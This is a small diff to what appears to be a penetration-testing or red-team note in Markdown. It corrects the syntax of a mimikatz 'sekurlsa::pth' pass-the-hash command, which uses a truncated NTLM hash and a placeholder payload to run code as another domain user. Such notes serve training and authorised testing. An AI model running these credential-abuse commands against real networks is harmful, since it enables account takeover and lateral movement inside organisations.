@@ -71,7 +71,7 @@ Domain            : TEST
 ```
 mimikatz # token::revert 
 
-mimikatz # sekurlsa::pth /user jarrett.goh /domain:test.domain /ntlm:1b2axxxx /run:"<payload>"
+mimikatz # sekurlsa::pth /user:jarrett.goh /domain:test.domain /ntlm:1b2axxxx /run:"<payload>"
 ```
 {% endcode %}
 
